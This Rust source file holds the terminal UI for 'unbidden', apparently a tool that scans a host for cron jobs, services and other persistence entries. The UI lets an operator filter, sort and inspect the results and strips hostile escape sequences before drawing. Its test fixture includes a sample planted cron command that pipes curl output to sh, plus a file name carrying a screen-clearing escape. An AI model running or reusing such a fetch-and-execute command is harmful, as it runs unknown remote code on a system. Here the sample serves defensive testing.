//! A terminal UI over a finished scan: a list that narrows as the query is
//! typed, pickers that count what a filter would leave, and the full entry
//! behind Enter. It is a viewer of the scan and nothing more: it runs no
//! collector, executes nothing on the host, and draws only text that went
//! through `render::visible`, since a file name or command line is hostile
//! input and a raw escape sequence in one is an instruction to the terminal.
//!
//! The state machine (`App`) is a plain value with no terminal in it, so the
//! tests below drive it with keys and read back the frame it would draw.
//! `run` is the thin part that owns the terminal.

use std::io::{self, Write};

use crate::entry::{Entry, Flag};
use crate::explain;
use crate::query::{self, Query};
use crate::render::{clip, flags_text, suppressed, visible};
use crate::root::Root;
use crate::scan::Scan;

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Key {
    Char(char),
    Up,
    Down,
    PageUp,
    PageDown,
    Home,
    End,
    Enter,
    Esc,
    Backspace,
    Tab,
    CtrlC,
    CtrlU,
}

/// The first key in `bytes` and how many bytes it took, or `None` when the
/// bytes are the start of a longer sequence. A lone ESC is the caller's
/// decision: only it knows whether more bytes are coming.
pub fn decode(bytes: &[u8]) -> Option<(Key, usize)> {
    let first = *bytes.first()?;
    match first {
        0x1b => {
            let rest = &bytes[1..];
            match rest.first() {
                None => None,
                Some(b'[') | Some(b'O') => {
                    let body = &rest[1..];
                    let end = body.iter().position(|b| (0x40..=0x7e).contains(b))?;
                    let key = match (&body[..end], body[end]) {
                        (b"", b'A') => Key::Up,
                        (b"", b'B') => Key::Down,
                        (b"", b'H') | (b"1", b'~') | (b"7", b'~') => Key::Home,
                        (b"", b'F') | (b"4", b'~') | (b"8", b'~') => Key::End,
                        (b"5", b'~') => Key::PageUp,
                        (b"6", b'~') => Key::PageDown,
                        _ => Key::Esc,
                    };
                    Some((key, 2 + end + 1))
                }
                Some(_) => Some((Key::Esc, 1)),
            }
        }
        3 => Some((Key::CtrlC, 1)),
        9 => Some((Key::Tab, 1)),
        10 | 13 => Some((Key::Enter, 1)),
        21 => Some((Key::CtrlU, 1)),
        8 | 0x7f => Some((Key::Backspace, 1)),
        b if b < 0x20 => Some((Key::Esc, 1)),
        b if b < 0x80 => Some((Key::Char(b as char), 1)),
        b => {
            let need = if b >= 0xf0 { 4 } else if b >= 0xe0 { 3 } else { 2 };
            let chunk = bytes.get(..need)?;
            Some((std::str::from_utf8(chunk).ok().and_then(|s| s.chars().next()).map_or(Key::Esc, Key::Char), need))
        }
    }
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum Mode {
    List,
    Query,
    Picker,
    Detail,
    Help,
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum Sort {
    Scan,
    Name,
    Flags,
}

struct Picker {
    field: &'static str,
    values: Vec<(String, usize)>,
    cursor: usize,
}

pub struct App<'a> {
    scan: &'a Scan,
    root: &'a Root,
    query: String,
    show_all: bool,
    sort: Sort,
    /// Indices into `scan.entries`, in display order.
    shown: Vec<usize>,
    /// How many the default view would hide that the query otherwise keeps.
    hidden: usize,
    cursor: usize,
    top: usize,
    mode: Mode,
    picker: Option<Picker>,
    detail: Vec<String>,
    detail_top: usize,
    pub quit: bool,
}

impl<'a> App<'a> {
    pub fn new(scan: &'a Scan, root: &'a Root, show_all: bool) -> App<'a> {
        let mut app = App {
            scan,
            root,
            query: String::new(),
            show_all,
            sort: Sort::Scan,
            shown: Vec::new(),
            hidden: 0,
            cursor: 0,
            top: 0,
            mode: Mode::List,
            picker: None,
            detail: Vec::new(),
            detail_top: 0,
            quit: false,
        };
        app.refilter();
        app
    }

    fn entry(&self, shown_index: usize) -> &Entry {
        &self.scan.entries[self.shown[shown_index]]
    }

    fn refilter(&mut self) {
        let keep = self.shown.get(self.cursor).copied();
        let q = Query::parse(&self.query);
        self.shown.clear();
        self.hidden = 0;
        for (i, e) in self.scan.entries.iter().enumerate() {
            if !q.matches(e) {
                continue;
            }
            if !self.show_all && suppressed(e) {
                self.hidden += 1;
            } else {
                self.shown.push(i);
            }
        }
        let entries = &self.scan.entries;
        match self.sort {
            Sort::Scan => {}
            Sort::Name => self.shown.sort_by(|a, b| entries[*a].name.to_lowercase().cmp(&entries[*b].name.to_lowercase())),
            Sort::Flags => self.shown.sort_by_key(|i| std::cmp::Reverse(entries[*i].flags.iter().filter(|f| **f != Flag::DegradedEnablement).count())),
        }
        self.cursor = keep.and_then(|k| self.shown.iter().position(|i| *i == k)).unwrap_or(0);
        self.top = 0;
    }

    fn open_picker(&mut self, field: &'static str) {
        let base = query::without_field(&self.query, field);
        let q = Query::parse(&base);
        let mut counts: std::collections::BTreeMap<String, usize> = std::collections::BTreeMap::new();
        for e in &self.scan.entries {
            if !q.matches(e) || (!self.show_all && suppressed(e)) {
                continue;
            }
            let values: Vec<String> = match field {
                "kind" => vec![e.kind.as_str().to_string()],
                "enabled" => vec![e.enabled.as_str().to_string()],
                "trigger" => vec![e.trigger.as_str().to_string()],
                "prov" => query::provenance_words(&e.provenance).into_iter().map(str::to_string).collect(),
                _ if e.flags.is_empty() => vec!["none".to_string()],
                _ => e.flags.iter().map(|f| f.as_str().to_string()).collect(),
            };
            for v in values {
                *counts.entry(v).or_default() += 1;
            }
        }
        let mut values: Vec<(String, usize)> = counts.into_iter().collect();
        values.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
        self.picker = Some(Picker { field, values, cursor: 0 });
        self.mode = Mode::Picker;
    }

    fn open_detail(&mut self) {
        if self.shown.is_empty() {
            return;
        }
        let mut buf = Vec::new();
        let e = self.entry(self.cursor);
        let text = match explain::write(&mut buf, self.root, e, true) {
            Ok(()) => String::from_utf8_lossy(&buf).into_owned(),
            Err(err) => format!("cannot show this entry: {err}"),
        };
        self.detail = text.lines().map(str::to_string).collect();
        self.detail_top = 0;
        self.mode = Mode::Detail;
    }

    fn step(&mut self, delta: isize, page: usize) {
        let _ = page;
        let last = self.shown.len().saturating_sub(1) as isize;
        self.cursor = (self.cursor as isize + delta).clamp(0, last.max(0)) as usize;
    }

    /// Keeps the cursor row on screen, moving the window the least it can.
    fn keep_in_view(&mut self, height: usize) {
        let rows = height.max(6).saturating_sub(4).max(1);
        if self.cursor < self.top {
            self.top = self.cursor;
        } else if self.cursor >= self.top + rows {
            self.top = self.cursor + 1 - rows;
        }
    }

    pub fn handle(&mut self, key: Key, height: usize) {
        self.dispatch(key, height);
        self.keep_in_view(height);
    }

    fn dispatch(&mut self, key: Key, height: usize) {
        let page = height.saturating_sub(5).max(1) as isize;
        if key == Key::CtrlC {
            self.quit = true;
            return;
        }
        match self.mode {
            Mode::Query => match key {
                Key::Enter | Key::Esc => self.mode = Mode::List,
                Key::Backspace => {
                    self.query.pop();
                    self.refilter();
                }
                Key::CtrlU => {
                    self.query.clear();
                    self.refilter();
                }
                Key::Char(c) => {
                    self.query.push(c);
                    self.refilter();
                }
                Key::Up => self.step(-1, 0),
                Key::Down => self.step(1, 0),
                _ => {}
            },
            Mode::Picker => {
                let Some(p) = self.picker.as_mut() else { return };
                let chosen = match key {
                    Key::Esc | Key::Char('q') => {
                        self.picker = None;
                        self.mode = Mode::List;
                        return;
                    }
                    Key::Up | Key::Char('k') => {
                        p.cursor = p.cursor.saturating_sub(1);
                        None
                    }
                    Key::Down | Key::Char('j') => {
                        p.cursor = (p.cursor + 1).min(p.values.len().saturating_sub(1));
                        None
                    }
                    Key::Enter | Key::Char(' ') => p.values.get(p.cursor).map(|(value, _)| (p.field, value.clone(), p.cursor)),
                    _ => None,
                };
                if let Some((field, value, at)) = chosen {
                    self.query = query::toggle_choice(&self.query, field, &value);
                    self.refilter();
                    // Counts move with the query; the picker reopens on the
                    // same row.
                    self.open_picker(field);
                    if let Some(p) = self.picker.as_mut() {
                        p.cursor = at.min(p.values.len().saturating_sub(1));
                    }
                }
            }
            Mode::Detail => match key {
                Key::Esc | Key::Char('q') | Key::Enter => self.mode = Mode::List,
                Key::Up | Key::Char('k') => self.detail_top = self.detail_top.saturating_sub(1),
                Key::Down | Key::Char('j') => self.detail_top = (self.detail_top + 1).min(self.detail.len().saturating_sub(1)),
                Key::PageUp => self.detail_top = self.detail_top.saturating_sub(page as usize),
                Key::PageDown => self.detail_top = (self.detail_top + page as usize).min(self.detail.len().saturating_sub(1)),
                Key::Home | Key::Char('g') => self.detail_top = 0,
                Key::End | Key::Char('G') => self.detail_top = self.detail.len().saturating_sub(1),
                _ => {}
            },
            Mode::Help => self.mode = Mode::List,
            Mode::List => match key {
                Key::Char('q') | Key::Esc => {
                    if self.query.is_empty() || key == Key::Char('q') {
                        self.quit = true;
                    } else {
                        self.query.clear();
                        self.refilter();
                    }
                }
                Key::Up | Key::Char('k') => self.step(-1, 0),
                Key::Down | Key::Char('j') => self.step(1, 0),
                Key::PageUp => self.step(-page, 0),
                Key::PageDown => self.step(page, 0),
                Key::Home | Key::Char('g') => self.cursor = 0,
                Key::End | Key::Char('G') => self.cursor = self.shown.len().saturating_sub(1),
                Key::Char('/') => self.mode = Mode::Query,
                Key::Enter => self.open_detail(),
                Key::Char('a') => {
                    self.show_all = !self.show_all;
                    self.refilter();
                }
                Key::Char('c') | Key::CtrlU => {
                    self.query.clear();
                    self.refilter();
                }
                Key::Char('s') => {
                    self.sort = match self.sort {
                        Sort::Scan => Sort::Flags,
                        Sort::Flags => Sort::Name,
                        Sort::Name => Sort::Scan,
                    };
                    self.refilter();
                }
                Key::Char('f') | Key::Tab => self.open_picker("kind"),
                Key::Char('F') => self.open_picker("flag"),
                Key::Char('e') => self.open_picker("enabled"),
                Key::Char('p') => self.open_picker("prov"),
                Key::Char('t') => self.open_picker("trigger"),
                Key::Char('?') => self.mode = Mode::Help,
                _ => {}
            },
        }
    }

    /// The frame for a `width` by `height` terminal: exactly `height` lines,
    /// none wider than `width` characters, using only the escapes this
    /// function writes itself.
    pub fn render(&self, width: usize, height: usize) -> Vec<String> {
        let width = width.max(20);
        let height = height.max(6);
        let mut lines: Vec<String> = Vec::with_capacity(height);
        let fit = |s: &str| clip(s, width);
        let bold = |s: &str| format!("\x1b[1m{s}\x1b[0m");
        let reverse = |s: &str| format!("\x1b[7m{s}\x1b[0m");
        let dim = |s: &str| format!("\x1b[2m{s}\x1b[0m");

        let hidden = if self.hidden > 0 { format!("  ({} packaged and intact hidden: a)", self.hidden) } else { String::new() };
        let sort = match self.sort {
            Sort::Scan => "",
            Sort::Name => "  sorted by name",
            Sort::Flags => "  flagged first",
        };
        lines.push(reverse(&format!("{:<width$}", fit(&format!(" unbidden  {} of {} shown{hidden}{sort}", self.shown.len(), self.scan.entries.len())))));

        let editing = self.mode == Mode::Query;
        let q = visible(&self.query, false);
        lines.push(if self.query.is_empty() && !editing {
            dim(&fit(" filter: none   / to type   f k e p t F to pick   ? for help"))
        } else {
            fit(&format!(" filter: {q}{}", if editing { "_" } else { "" }))
        });

        let body_rows = height - 3;
        match self.mode {
            Mode::Help => lines.extend(self.help_lines(width, body_rows)),
            Mode::Picker => lines.extend(self.picker_lines(width, body_rows)),
            Mode::Detail => {
                lines.push(bold(&fit(" entry (Esc to go back, arrows to scroll)")));
                for l in self.detail.iter().skip(self.detail_top).take(body_rows - 1) {
                    lines.push(fit(&visible(l, false)));
                }
            }
            _ => lines.extend(self.list_lines(width, body_rows)),
        }
        while lines.len() < height - 1 {
            lines.push(String::new());
        }
        lines.truncate(height - 1);
        let keys = match self.mode {
            Mode::List => " j/k move   Enter details   / filter   f k e p t F pick   a hidden   s sort   c clear   q quit",
            Mode::Query => " type a query   Enter or Esc to leave   Ctrl-U clears",
            Mode::Picker => " j/k move   Space or Enter toggle   Esc back",
            Mode::Detail => " j/k scroll   Esc back",
            Mode::Help => " any key to go back",
        };
        lines.push(dim(&fit(keys)));
        lines
    }

    fn list_lines(&self, width: usize, rows: usize) -> Vec<String> {
        let mut out = Vec::new();
        let kind_w = 16usize;
        let en_w = 8usize;
        let name_w = (width / 4).clamp(16, 34);
        let flag_w = 22usize.min(width / 4);
        let fixed = 12 + 1 + kind_w + 1 + en_w + 1 + name_w + 1 + flag_w + 1;
        let cmd_w = width.saturating_sub(fixed + 1).max(8);
        out.push(format!("\x1b[1m {:<12} {:<kind_w$} {:<en_w$} {:<name_w$} {:<flag_w$} {}\x1b[0m", "ID", "KIND", "ENABLED", "NAME", "FLAGS", "COMMAND"));
        if self.shown.is_empty() {
            out.push(" nothing matches; Esc or c clears the filter".to_string());
            return out;
        }
        let rows = rows.saturating_sub(1);
        for (n, i) in self.shown.iter().enumerate().skip(self.top).take(rows) {
            let e = &self.scan.entries[*i];
            let command = match &e.command {
                Some(c) => String::from_utf8_lossy(c).into_owned(),
                None => e.target_path.as_ref().map_or_else(|| e.source.to_string_lossy().into_owned(), |p| p.to_string_lossy().into_owned()),
            };
            let row = format!(
                " {:<12} {:<kind_w$} {:<en_w$} {:<name_w$} {:<flag_w$} {}",
                e.short_id(),
                clip(e.kind.as_str(), kind_w),
                clip(e.enabled.as_str(), en_w),
                clip(&visible(&e.name, false), name_w),
                clip(&flags_text(e), flag_w),
                clip(&visible(&command, false), cmd_w),
            );
            let row = clip(&row, width);
            out.push(if n == self.cursor { format!("\x1b[7m{row:<width$}\x1b[0m") } else { row });
        }
        out
    }

    fn picker_lines(&self, width: usize, rows: usize) -> Vec<String> {
        let Some(p) = &self.picker else { return Vec::new() };
        let title = match p.field {
            "kind" => "kinds",
            "flag" => "flags",
            "enabled" => "enablement",
            "prov" => "provenance",
            _ => "triggers",
        };
        let mut out = vec![format!("\x1b[1m {title} (counts are for the rest of the query)\x1b[0m")];
        let rows = rows.saturating_sub(1);
        let top = if p.cursor >= rows { p.cursor + 1 - rows } else { 0 };
        for (n, (value, count)) in p.values.iter().enumerate().skip(top).take(rows) {
            let mark = if query::has_choice(&self.query, p.field, value) { "x" } else { " " };
            let row = clip(&format!(" [{mark}] {value:<28} {count:>6}"), width);
            out.push(if n == p.cursor { format!("\x1b[7m{row:<width$}\x1b[0m") } else { row });
        }
        out
    }

    fn help_lines(&self, width: usize, rows: usize) -> Vec<String> {
        let text = [
            " unbidden: browse a scan",
            "",
            " Type / and a query; the list narrows as you type.",
            "   curl                    anything that mentions curl",
            "   kind:cron|at_job        a kind, by prefix; | accepts either",
            "   -flag:unpackaged        a leading - negates",
            "   enabled:enabled         enablement, by prefix",
            "   prov:unpackaged         packaged intact modified unpackaged unknown generated reproduced",
            "   flag:none               entries with no flag",
            "   pkg: user: src: cmd: name: id: collector: trigger: note:",
            "   cmd:\"curl -s\"           a value with a blank is quoted",
            "",
            " f k e p t F open a picker with counts; Space toggles a value into the query.",
            " a shows or hides what is packaged and intact. s cycles the sort.",
            " Enter shows the whole entry, with the text it came from.",
        ];
        text.iter().take(rows).map(|l| clip(l, width)).collect()
    }
}

/// Owns the terminal: raw mode, the alternate screen, and a hidden cursor,
/// all put back when it is dropped, panic or not.
struct Terminal {
    saved: rustix::termios::Termios,
}

impl Terminal {
    fn enter() -> io::Result<Terminal> {
        use rustix::termios::{OptionalActions, SpecialCodeIndex, tcgetattr, tcsetattr};
        let stdin = io::stdin();
        let saved = tcgetattr(&stdin)?;
        let mut raw = saved.clone();
        raw.make_raw();
        // A read returns after a tenth of a second with nothing, so the loop
        // can notice a resize and a lone Esc.
        raw.special_codes[SpecialCodeIndex::VMIN] = 0;
        raw.special_codes[SpecialCodeIndex::VTIME] = 1;
        tcsetattr(&stdin, OptionalActions::Flush, &raw)?;
        let mut out = io::stdout();
        out.write_all(b"\x1b[?1049h\x1b[?25l")?;
        out.flush()?;
        Ok(Terminal { saved })
    }
}

impl Drop for Terminal {
    fn drop(&mut self) {
        let mut out = io::stdout();
        let _ = out.write_all(b"\x1b[?25h\x1b[?1049l");
        let _ = out.flush();
        let _ = rustix::termios::tcsetattr(&io::stdin(), rustix::termios::OptionalActions::Flush, &self.saved);
    }
}

fn size() -> (usize, usize) {
    match rustix::termios::tcgetwinsize(&io::stdout()) {
        Ok(s) if s.ws_col >= 20 && s.ws_row >= 6 => (s.ws_col as usize, s.ws_row as usize),
        _ => (100, 30),
    }
}

/// Runs the UI until the operator quits. It needs a terminal on both ends.
pub fn run(scan: &Scan, root: &Root, show_all: bool) -> io::Result<()> {
    use std::io::IsTerminal;
    if !io::stdin().is_terminal() || !io::stdout().is_terminal() {
        return Err(io::Error::other("the terminal UI needs a terminal; use `unbidden --json` to pipe the scan"));
    }
    let mut app = App::new(scan, root, show_all);
    let _terminal = Terminal::enter()?;
    let mut pending: Vec<u8> = Vec::new();
    let mut last = (0, 0);
    let mut dirty = true;
    let mut out = io::stdout();
    while !app.quit {
        let (w, h) = size();
        if dirty || (w, h) != last {
            let frame = app.render(w, h);
            let mut buf = String::new();
            for (i, line) in frame.iter().enumerate() {
                buf.push_str(&format!("\x1b[{};1H{line}\x1b[0m\x1b[K", i + 1));
            }
            out.write_all(buf.as_bytes())?;
            out.flush()?;
            last = (w, h);
            dirty = false;
        }
        let mut byte = [0u8; 64];
        let n = rustix::io::read(&io::stdin(), &mut byte)?;
        pending.extend_from_slice(&byte[..n]);
        // Bytes arrived or a tenth of a second passed: what is pending is a
        // whole key, or an unfinished sequence that will not be finished.
        while !pending.is_empty() {
            match decode(&pending) {
                Some((key, used)) => {
                    pending.drain(..used);
                    app.handle(key, h);
                    dirty = true;
                }
                None if n == 0 => {
                    // A sequence that never finished: a lone Esc.
                    pending.clear();
                    app.handle(Key::Esc, h);
                    dirty = true;
                }
                None => break,
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::entry::{Integrity, Kind, Provenance};

    fn entry(kind: Kind, name: &str, cmd: &str) -> Entry {
        let mut e = Entry::new(kind, format!("/etc/{name}"), name);
        e.command = Some(cmd.as_bytes().to_vec());
        e
    }

    fn scan_of(entries: Vec<Entry>) -> Scan {
        let mut s = crate::scan::run(&Root::at(std::env::temp_dir()).unwrap(), &crate::scan::Options { deep: false }, &[]);
        s.entries = entries;
        s
    }

    fn fixture() -> (Scan, Root) {
        let mut vendor = entry(Kind::SystemdUnit, "sshd.service", "/usr/sbin/sshd");
        vendor.provenance = Provenance::Packaged { package: "openssh".into(), version: "9".into(), integrity: Integrity::Intact };
        let mut planted = entry(Kind::Cron, "backup", "/usr/bin/curl -s http://x | sh");
        planted.provenance = Provenance::Unpackaged;
        planted.flag(Flag::Unpackaged);
        let hostile = entry(Kind::ShellProfile, "\u{1b}[2Jgotcha", "echo \u{1b}[31mred");
        let other = entry(Kind::Udev, "99-local.rules", "RUN+=\"/bin/true\"");
        (scan_of(vec![vendor, planted, hostile, other]), Root::at(std::env::temp_dir()).unwrap())
    }

    fn type_text(app: &mut App, text: &str) {
        app.handle(Key::Char('/'), 24);
        for c in text.chars() {
            app.handle(Key::Char(c), 24);
        }
        app.handle(Key::Enter, 24);
    }

    #[test]
    fn keys_decode_from_the_bytes_a_terminal_sends() {
        assert_eq!(decode(b"\x1b[A"), Some((Key::Up, 3)));
        assert_eq!(decode(b"\x1b[6~x"), Some((Key::PageDown, 4)));
        assert_eq!(decode(b"\x1bOH"), Some((Key::Home, 3)));
        assert_eq!(decode(b"\x1b"), None, "the start of a longer sequence");
        assert_eq!(decode(b"\x1b["), None);
        assert_eq!(decode(b"\x1bx"), Some((Key::Esc, 1)), "Esc, then the key after it");
        assert_eq!(decode(b"\r"), Some((Key::Enter, 1)));
        assert_eq!(decode(b"\x7f"), Some((Key::Backspace, 1)));
        assert_eq!(decode("é".as_bytes()), Some((Key::Char('é'), 2)));
        assert_eq!(decode(&"é".as_bytes()[..1]), None, "half a character");
        assert_eq!(decode(b"\x03"), Some((Key::CtrlC, 1)));
    }

    #[test]
    fn typing_a_query_narrows_the_list_and_the_default_view_hides_what_is_vendor() {
        let (scan, root) = fixture();
        let mut app = App::new(&scan, &root, false);
        assert_eq!(app.shown.len(), 3, "the packaged, intact unit is hidden");
        assert_eq!(app.hidden, 1);
        type_text(&mut app, "curl");
        assert_eq!(app.shown.len(), 1);
        app.handle(Key::Char('c'), 24);
        assert_eq!(app.shown.len(), 3);
        app.handle(Key::Char('a'), 24);
        assert_eq!(app.shown.len(), 4, "a shows the hidden");
        type_text(&mut app, "prov:intact");
        assert_eq!(app.shown.len(), 1);
    }

    #[test]
    fn a_picker_counts_and_edits_the_query() {
        let (scan, root) = fixture();
        let mut app = App::new(&scan, &root, true);
        app.handle(Key::Char('f'), 24);
        let frame = app.render(80, 24).join("\n");
        assert!(frame.contains("[ ] cron"), "{frame}");
        assert!(frame.contains("kinds"));
        // The picker lists the most common first, then by name: cron is first.
        app.handle(Key::Enter, 24);
        assert_eq!(app.query, "kind:cron");
        assert_eq!(app.shown.len(), 1);
        assert!(app.render(80, 24).join("\n").contains("[x] cron"));
        app.handle(Key::Esc, 24);
        assert_eq!(app.mode, Mode::List);
    }

    #[test]
    fn hostile_text_never_reaches_the_terminal_as_an_escape() {
        let (scan, root) = fixture();
        let app = App::new(&scan, &root, true);
        for line in app.render(100, 24) {
            // Strip the sequences the frame writes itself; no other ESC may remain.
            let mut stripped = String::new();
            let mut chars = line.chars().peekable();
            while let Some(c) = chars.next() {
                if c == '\u{1b}' && chars.peek() == Some(&'[') {
                    let rest: String = chars.clone().skip(1).take_while(|c| *c != 'm').collect();
                    assert!(matches!(rest.as_str(), "0" | "1" | "2" | "7"), "unexpected escape {rest:?} in {line:?}");
                    for _ in 0..rest.chars().count() + 2 {
                        chars.next();
                    }
                } else {
                    stripped.push(c);
                }
            }
            assert!(!stripped.contains('\u{1b}'), "{line:?}");
        }
        let joined = app.render(100, 24).join("\n");
        assert!(joined.contains("\\x1b[2Jgotcha"), "the escape is shown as text");
    }

    #[test]
    fn the_window_follows_the_cursor_and_moves_no_further_than_it_must() {
        let many: Vec<Entry> = (0..40).map(|n| entry(Kind::Cron, &format!("job{n:02}"), "/bin/true")).collect();
        let scan = scan_of(many);
        let root = Root::at(std::env::temp_dir()).unwrap();
        let mut app = App::new(&scan, &root, true);
        for _ in 0..30 {
            app.handle(Key::Down, 14);
        }
        let frame = app.render(80, 14).join("\n");
        assert!(frame.contains("job30"), "the cursor row is on screen");
        let top_after_down = app.top;
        for _ in 0..3 {
            app.handle(Key::Up, 14);
        }
        assert_eq!(app.top, top_after_down, "moving up inside the window scrolls nothing");
        app.handle(Key::Char('g'), 14);
        assert_eq!(app.top, 0);
        assert!(app.render(80, 14).join("\n").contains("job00"));
    }

    #[test]
    fn the_frame_fits_the_terminal() {
        let (scan, root) = fixture();
        let mut app = App::new(&scan, &root, true);
        for (w, h) in [(80, 24), (40, 10), (200, 50), (20, 6)] {
            let frame = app.render(w, h);
            assert_eq!(frame.len(), h.max(6), "{w}x{h}");
        }
        app.handle(Key::Char('?'), 24);
        assert!(app.render(80, 24).join("\n").contains("kind:cron|at_job"));
    }

    #[test]
    fn enter_shows_the_entry_and_the_cursor_follows_the_filter() {
        let (scan, root) = fixture();
        let mut app = App::new(&scan, &root, true);
        app.handle(Key::Char('j'), 24);
        app.handle(Key::Enter, 24);
        assert_eq!(app.mode, Mode::Detail);
        assert!(app.detail.iter().any(|l| l.contains("backup")), "{:?}", app.detail);
        app.handle(Key::Esc, 24);
        // Narrowing keeps the entry under the cursor where it still matches.
        type_text(&mut app, "backup");
        assert_eq!(app.entry(app.cursor).name, "backup");
        app.handle(Key::Char('q'), 24);
        assert!(app.quit);
    }
}
